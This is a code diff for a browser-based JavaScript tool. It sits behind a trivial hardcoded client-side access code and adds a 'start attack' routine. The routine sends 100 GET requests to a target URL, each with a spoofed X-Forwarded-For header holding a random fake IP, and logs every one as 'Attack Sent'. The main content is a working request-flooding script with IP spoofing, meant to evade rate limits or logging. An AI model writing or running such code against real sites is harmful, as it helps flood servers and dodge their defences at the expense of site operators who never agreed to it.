@@ -4,7 +4,7 @@ document.addEventListener("DOMContentLoaded", function () {
     const loginButton = document.getElementById("login-button");
     const startAttackButton = document.getElementById("start-attack");
     const logContainer = document.getElementById("log");
-    const validCode = "QZ-20-VB"; // Change this to your desired access code
+    const validCode = "12345"; // Change this to your desired access code
 
     // Handle Login
     loginButton.addEventListener("click", function () {
@@ -35,3 +35,30 @@ document.addEventListener("DOMContentLoaded", function () {
             try {
                 const response = await fetch(url, {
                     method: "GET",
+                    headers: {
+                        "User-Agent": "Web-Simulator",
+                        "X-Forwarded-For": fakeIP,
+                    },
+                });
+                log(`Attack Sent | Status: ${response.status} | Fake IP: ${fakeIP}`);
+            } catch (error) {
+                log(`Request Error: ${error.message}`);
+            }
+        }
+
+        function log(message) {
+            const logEntry = document.createElement("div");
+            logEntry.textContent = message;
+            logContainer.appendChild(logEntry);
+        }
+
+        async function startAttack() {
+            for (let i = 0; i < 100; i++) {
+                const fakeIP = generateFakeIP();
+                await sendRequest(targetUrl, fakeIP);
+            }
+        }
+
+        startAttack();
+    });
+});
